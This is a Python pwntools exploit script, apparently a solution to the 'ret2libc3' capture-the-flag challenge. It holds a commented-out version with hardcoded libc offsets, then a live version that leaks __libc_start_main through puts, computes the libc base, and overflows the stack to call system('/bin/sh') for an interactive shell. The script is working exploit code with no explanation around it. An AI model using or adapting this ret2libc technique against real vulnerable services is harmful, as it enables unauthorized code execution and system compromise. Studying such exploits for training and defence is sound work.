# #!/usr/bin/env python
# from pwn import *

# sh = process('./ret2libc3')

# base_addr = 0xf7d20000
# system_offset = 0x0000000000050d70
# binsh_offset = 0x00000000001d8698
# offset = 0x6c + 4

# system_addr = base_addr + system_offset
# binsh_addr = base_addr + binsh_offset

# payload = flat([b'A' * offset, system_addr, b'b' * 4, binsh_addr])

# sh.sendline(payload)
# sh.interactive()

#!/usr/bin/env python
from pwn import *
# from LibcSearcher import LibcSearcher
sh = process('./ret2libc3')

elf_ret2libc3 = ELF('./ret2libc3')
elf_libc = ELF('/lib/i386-linux-gnu/libc.so.6')

puts_plt = elf_ret2libc3.plt['puts']
libc_start_main_got = elf_ret2libc3.got['__libc_start_main']
addr_start = elf_ret2libc3.symbols['_start']
offset = 0x6c + 4

print("leak libc_start_main_got addr and return to main again")
payload = flat([b'A' * 112, puts_plt, addr_start, libc_start_main_got])
sh.sendlineafter(b'Can you find it !?', payload)

print("get the related addr")
libc_start_main_addr = u32(sh.recv()[0:4])
libc_base = libc_start_main_addr - elf_libc.symbols['__libc_start_main']
system_addr = libc_base + elf_libc.symbols['system']
binsh_addr = libc_base + next(elf_libc.search(b'/bin/sh'))

print("get shell")
payload = flat([b'A' * 112, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)

sh.interactive()